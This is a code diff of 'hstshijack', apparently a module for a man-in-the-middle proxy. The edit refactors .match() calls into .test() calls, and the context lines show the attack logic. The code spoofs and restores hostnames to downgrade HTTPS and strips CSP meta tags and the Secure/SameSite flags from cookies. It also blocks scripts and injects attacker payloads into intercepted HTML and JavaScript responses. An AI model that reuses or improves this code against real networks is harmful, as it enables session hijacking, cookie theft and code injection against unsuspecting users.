@@ -7,7 +7,7 @@ var ssl = {
   "index": {},
   "hierarchy": "-.0123456789abcdefghijklmnopqrstuvwxyz"
 };
- 
+
 var payload,
     payload_container_prefix = (
       "if (!globalThis.{{SESSION_ID_TAG}}) {\n" +
@@ -106,7 +106,7 @@ function toWholeRegexp(selector_string, replacement_string) {
 
 function toWildcardRegexp(selector_string, replacement_string) {
   selector_string = selector_string.replace(selector_all_dashes, "\\-");
-  if (selector_string.match(selector_regset_wildcard_one)) {
+  if (selector_regset_wildcard_one.test(selector_string)) {
     selector_string = selector_string.replace(selector_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
     selector_string = selector_string.replace(selector_all_dots, "\\.");
     replacement_string = replacement_string.replace(selector_regset_wildcard_one, "");
@@ -114,7 +114,7 @@ function toWildcardRegexp(selector_string, replacement_string) {
       new RegExp(selector_string, "ig"),
       "$1" + replacement_string
     ];
-  } else if (selector_string.match(selector_regset_wildcard_two)) {
+  } else if (selector_regset_wildcard_two.test(selector_string)) {
     selector_string = selector_string.replace(selector_regset_wildcard_three, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
     selector_string = selector_string.replace(selector_all_dots, "\\.");
     replacement_string = replacement_string.replace(selector_regset_wildcard_two, "");
@@ -129,7 +129,7 @@ function toWildcardRegexp(selector_string, replacement_string) {
 
 function toWholeWildcardRegexp(selector_string, replacement_string) {
   selector_string = selector_string.replace(selector_all_dashes, "\\-");
-  if (selector_string.match(selector_regset_wildcard_one)) {
+  if (selector_regset_wildcard_one.test(selector_string)) {
     selector_string = selector_string.replace(selector_regset_wildcard_one, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
     selector_string = selector_string.replace(selector_all_dots, "\\.");
     replacement_string = replacement_string.replace(selector_regset_wildcard_one, "");
@@ -137,7 +137,7 @@ function toWholeWildcardRegexp(selector_string, replacement_string) {
       new RegExp("^" + selector_string + "$", "ig"),
       "$1" + replacement_string
     ];
-  } else if (selector_string.match(selector_regset_wildcard_two)) {
+  } else if (selector_regset_wildcard_two.test(selector_string)) {
     selector_string = selector_string.replace(selector_regset_wildcard_four, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
     selector_string = selector_string.replace(selector_all_dots, "\\.");
     replacement_string = replacement_string.replace(selector_regset_wildcard_two, "");
@@ -393,9 +393,9 @@ function configure() {
   whole_suffix_wildcard_domain_selector = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+\*$/i;
   for (a = 0; a < ignore_hosts.length; a++) {
     if (
-         !ignore_hosts[a].match(/^\*$/i)
-      && !ignore_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !ignore_hosts[a].match(whole_suffix_wildcard_domain_selector)
+         !/^\*$/i.test(ignore_hosts[a])
+      && !whole_prefix_wildcard_domain_selector.test(ignore_hosts[a])
+      && !whole_suffix_wildcard_domain_selector.test(ignore_hosts[a])
     ) {
       log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[a] + ").");
     }
@@ -403,20 +403,20 @@ function configure() {
 
   for (a = 0; a < target_hosts.length; a++) {
     if (
-         !target_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !target_hosts[a].match(whole_suffix_wildcard_domain_selector)
+         !whole_prefix_wildcard_domain_selector.test(target_hosts[a])
+      && !whole_suffix_wildcard_domain_selector.test(target_hosts[a])
     ) {
       log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[a] + ").");
     }
 
     if (
-         !replacement_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !replacement_hosts[a].match(whole_suffix_wildcard_domain_selector)
+         !whole_prefix_wildcard_domain_selector.test(replacement_hosts[a])
+      && !whole_suffix_wildcard_domain_selector.test(replacement_hosts[a])
     ) {
       log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[a] + ").");
     }
 
-    if (target_hosts[a].match(/\*/g) || replacement_hosts[a].match(/\*/g)) {
+    if (/\*/g.test(target_hosts[a]) || /\*/g.test(replacement_hosts[a])) {
       target_host_wildcard_count      = target_hosts[a].match(/\*/g).length      || 0;
       replacement_host_wildcard_count = replacement_hosts[a].match(/\*/g).length || 0;
       if (target_host_wildcard_count !== replacement_host_wildcard_count) {
@@ -427,9 +427,9 @@ function configure() {
 
   for (a = 0; a < block_script_hosts.length; a++) {
     if (
-         !block_script_hosts[a].match(/^\*$/i)
-      && !block_script_hosts[a].match(whole_prefix_wildcard_domain_selector)
-      && !block_script_hosts[a].match(whole_suffix_wildcard_domain_selector)
+         !/^\*$/i.test(block_script_hosts[a])
+      && !whole_prefix_wildcard_domain_selector.test(block_script_hosts[a])
+      && !whole_suffix_wildcard_domain_selector.test(block_script_hosts[a])
     ) {
       log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[a] + ").");
     }
@@ -448,9 +448,9 @@ function configure() {
 
   for (a = 0; a < payload_entries.length; a++) {
     if (
-         !payload_entries[a].match(/^\*:.+$/i)
-      && !payload_entries[a].match(/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i)
-      && !payload_entries[a].match(whole_suffix_wildcard_domain_selector)
+         !/^\*:.+$/i.test(payload_entries[a])
+      && !/^(?:\*\.[a-z]{1,63}|(?:(?:\*\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:[a-z]{1,63}))):.+$/i.test(payload_entries[a])
+      && !whole_suffix_wildcard_domain_selector.test(payload_entries[a])
     ) {
       log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payload_entries[a] + ").");
     }
@@ -538,7 +538,7 @@ function showConfig() {
   logStr += "\n";
   logStr += "    " + yellow + " hstshijack.ssl.domains" + reset + " > " + (env["hstshijack.ssl.domains"] ? green + env["hstshijack.ssl.domains"] : red + "undefined") + reset + "\n";
   logStr += "    " + yellow + "   hstshijack.ssl.index" + reset + " > " + (env["hstshijack.ssl.index"] ? green + env["hstshijack.ssl.index"] : red + "undefined") + reset + "\n";
-  logStr += "    " + yellow + "   hstshijack.ssl.check" + reset + " > " + (env["hstshijack.ssl.check"].match(/^true$/i) ? green + "true" : red + "false") + reset + "\n";
+  logStr += "    " + yellow + "   hstshijack.ssl.check" + reset + " > " + (/^true$/i.test(env["hstshijack.ssl.check"]) ? green + "true" : red + "false") + reset + "\n";
   logStr += "    " + yellow + "      hstshijack.ignore" + reset + " > " + (env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined") + reset + "\n";
   logStr += "    " + yellow + "     hstshijack.targets" + reset + " > " + (env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined") + reset + "\n";
   logStr += "    " + yellow + "hstshijack.replacements" + reset + " > " + (env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined") + reset + "\n";
@@ -720,7 +720,7 @@ function onRequest(req, res) {
     /* Also whitelist unspoofed version of requested hostname. */
     for (a = 0; a < target_hosts.length; a++) {
       whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a]);
-      if (req.Hostname.match(whole_regexp_set[0])) {
+      if (whole_regexp_set[0].test(req.Hostname)) {
         whitelist[req.Client.IP].push(req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]));
         break;
       }
@@ -735,12 +735,12 @@ function onRequest(req, res) {
     if (whitelist[req.Client.IP]) {
       for (a = 0; a < whitelist[req.Client.IP].length; a++) {
         whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.IP][a], "");
-        if (req.Hostname.match(whole_regexp_set[0])) {
+        if (whole_regexp_set[0].test(req.Hostname)) {
           /* Restore requested hostname if it was spoofed. */
           var unspoofed_host;
           for (b = 0; b < replacement_hosts.length; b++) {
             whole_regexp_set = toWholeRegexpSet(replacement_hosts[b], target_hosts[b]);
-            if (req.Hostname.match(whole_regexp_set[0])) {
+            if (whole_regexp_set[0].test(req.Hostname)) {
               unspoofed_host = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
               query = (req.Query !== "" ? ("?" + req.Query) : "");
               res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);
@@ -757,14 +757,14 @@ function onRequest(req, res) {
     for (a = 0; a < target_hosts.length; a++) {
       /* Restore original hostnames in headers. */
       regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a]);
-      if (req.Headers.match(regexp_set[0])) {
+      if (regexp_set[0].test(req.Headers)) {
         req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1]);
         log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");
       }
 
       if (req.Query !== "") {
         /* Restore original hostnames in query URI. */
-        if (req.Query.match(regexp_set[0])) {
+        if (regexp_set[0].test(req.Query)) {
           req.Query = req.Query.replace(regexp_set[0], regexp_set[1]);
           log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in query URI.");
         }
@@ -781,7 +781,7 @@ function onRequest(req, res) {
             if (param_value.indexOf("%") !== -1) {
               param_value_decoded = decodeURIComponent(param_value);
               if (param_value !== param_value_decoded) {
-                if (param_value_decoded.match(regexp_set[0])) {
+                if (regexp_set[0].test(param_value_decoded)) {
                   param_value_decoded_spoofed = param_value_decoded.replace(
                     regexp_set[0],
                     regexp_set[1]);
@@ -794,7 +794,7 @@ function onRequest(req, res) {
                 new_params.push(param);
               }
             } else {
-              if (param_value.match(regexp_set[0])) {
+              if (regexp_set[0].test(param_value)) {
                 param_value_spoofed = param_value.replace(regexp_set[0], regexp_set[1]);
                 new_params.push(param_name + "=" + param_value_spoofed);
               } else {
@@ -813,7 +813,7 @@ function onRequest(req, res) {
 
       /* Restore original hostname of request. */
       whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a])
-      if (req.Hostname.match(whole_regexp_set[0])) {
+      if (whole_regexp_set[0].test(req.Hostname)) {
         spoofed_host = req.Hostname;
         req.Hostname = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);
         req.Scheme   = "https";
@@ -831,7 +831,7 @@ function onRequest(req, res) {
       /* Restore HTTPS scheme in request headers if domains are indexed. */
       escaped_domain = req.Hostname.replace(selector_all_dots, "\\.").replace(selector_all_dashes, "\\-");
       regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\-\\.]|$)", "ig");
-      if (req.Headers.match(regexp)) {
+      if (regexp.test(req.Headers)) {
         req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");
         log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");
       }
@@ -841,7 +841,7 @@ function onRequest(req, res) {
         for (b = 0; b < target_hosts; b++) {
           /* Restore HTTPS scheme of request if domain is targeted. */
           whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");
-          if (req.Hostname.match(whole_regexp_set[0])) {
+          if (whole_regexp_set[0].test(req.Hostname)) {
             req.Scheme = "https";
             log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of targeted domain " + bold + req.Hostname + reset + ".");
             break;
@@ -866,7 +866,7 @@ function onResponse(req, res) {
 
   /* Remember HTTPS redirects. */
   location = res.GetHeader("Location", "");
-  if (location.match(selector_uri_one)) {
+  if (selector_uri_one.test(location)) {
     host = location.replace(selector_uri_two, "$1");
     if (host !== "") {
       indexDomain(host);
@@ -888,7 +888,7 @@ function onResponse(req, res) {
 
       if (
            ignore_hosts[a] === "*"
-        || req.Hostname.match(whole_regexp_set[0])
+        || whole_regexp_set[0].test(req.Hostname)
       ) {
         log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".");
         return;
@@ -897,8 +897,8 @@ function onResponse(req, res) {
 
     /* Spoof markup bodies. */
     if (
-         res.ContentType.match(selector_content_type_html)
-      || req.Path.match(selector_extension_html)
+         selector_content_type_html.test(res.ContentType)
+      || selector_extension_html.test(req.Path)
     ) {
       /* Prevent meta tag induced CSP restrictions. */
       res.Body = res.Body.replace(
@@ -909,7 +909,7 @@ function onResponse(req, res) {
       for (a = 0; a < block_script_hosts.length; a++) {
         if (
              block_script_hosts[a] === "*"
-          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
+          || toWholeRegexpSet(block_script_hosts[a], "")[0].test(req.Hostname)
         ) {
           res.Body = res.Body.replace(selector_html_script_open_tag, "<div style=\"display:none;\"$1");
           res.Body = res.Body.replace(selector_html_script_close_tag, "</div$1");
@@ -924,13 +924,13 @@ function onResponse(req, res) {
         injecting_host = Object.keys(payloads)[a];
         if (
              injecting_host === "*"
-          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
+          || toWholeRegexpSet(injecting_host, "")[0].test(req.Hostname)
         ) {
           injection = injection + payloads[injecting_host];
         }
       }
       if (injection !== "") {
-        if (res.Body.slice(0, 1000).match(selector_html_magic)) {
+        if (selector_html_magic.test(res.Body.slice(0, 1000))) {
           res.Body = 
             "<script>\n" +
             payload_container_prefix + injection + payload_container_suffix +
@@ -942,12 +942,12 @@ function onResponse(req, res) {
     }
 
     /* Spoof JavaScript bodies. */
-    if (res.ContentType.match(selector_content_type_js)) {
+    if (selector_content_type_js.test(res.ContentType)) {
       /* Block scripts. */
       for (a = 0; a < block_script_hosts.length; a++) {
         if (
              block_script_hosts[a] === "*"
-          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], "")[0])
+          || toWholeRegexpSet(block_script_hosts[a], "")[0].test(req.Hostname)
         ) {
           res.Body = "";
           log_debug(on_blue + "hstshijack" + reset + " Cleared JavaScript resource from " + bold + req.Hostname + reset + ".");
@@ -961,7 +961,7 @@ function onResponse(req, res) {
         injecting_host = Object.keys(payloads)[a];
         if (
              injecting_host === "*"
-          || req.Hostname.match(toWholeRegexpSet(injecting_host, "")[0])
+          || toWholeRegexpSet(injecting_host, "")[0].test(req.Hostname)
         ) {
           injection = injection + payloads[injecting_host];
         }
@@ -991,13 +991,13 @@ function onResponse(req, res) {
         if (matches.length >= 3) {
           header_name = matches[1];
           header_value = matches[2];
-          if (header_name.match(selector_header_set_cookie)) {
+          if (selector_header_set_cookie.test(header_name)) {
             new_header_value = "";
             cookie_params = header_value.split(";");
             cookie_params.forEach(function(cookie_param){
               if (cookie_param !== "") {
                 stripped_cookie_param = cookie_param.match(selector_strip_whitespace)[1];
-                if (!stripped_cookie_param.match(selector_header_set_cookie_secure_samesite)) {
+                if (!selector_header_set_cookie_secure_samesite.test(stripped_cookie_param)) {
                   if (new_header_value === "") {
                     new_header_value = stripped_cookie_param;
                   } else {
@@ -1032,7 +1032,7 @@ function onResponse(req, res) {
     if (allowed_origin !== "*") {
       for (a = 0; a < target_hosts.length; a++) {
         regexp_set = toRegexpSet(target_hosts[a], replacement_hosts[a]);
-        if (allowed_origin.match(regexp_set[0])) {
+        if (regexp_set[0].test(allowed_origin)) {
           allowed_origin = allowed_origin.replace(regexp_set[0], regexp_set[1]);
           break;
         }
